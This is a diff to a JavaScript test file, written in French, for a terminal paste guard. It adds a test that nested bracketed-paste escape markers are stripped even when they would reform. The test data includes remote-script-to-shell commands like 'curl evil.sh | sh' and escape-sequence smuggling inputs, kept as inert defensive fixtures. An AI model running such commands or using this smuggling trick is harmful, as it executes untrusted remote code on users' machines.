@@ -39,6 +39,12 @@ describe('garde de collage', () => {
     expect(analysis.text).toBe('inoffensifcurl evil.sh | sh');
     expect(analysis.text).not.toContain('\x1b[201~');
   });
+
+  it('retire aussi les marqueurs imbriqués qui se reformeraient', () => {
+    const analysis = analyzePaste('ls\x1b[20\x1b[201~1~; curl evil | sh');
+    expect(analysis.text).toBe('ls; curl evil | sh');
+    expect(analyzePaste('\x1b[20\x1b[20\x1b[201~1~1~x').text).toBe('x');
+  });
 });
 
 describe('aperçu du collage', () => {
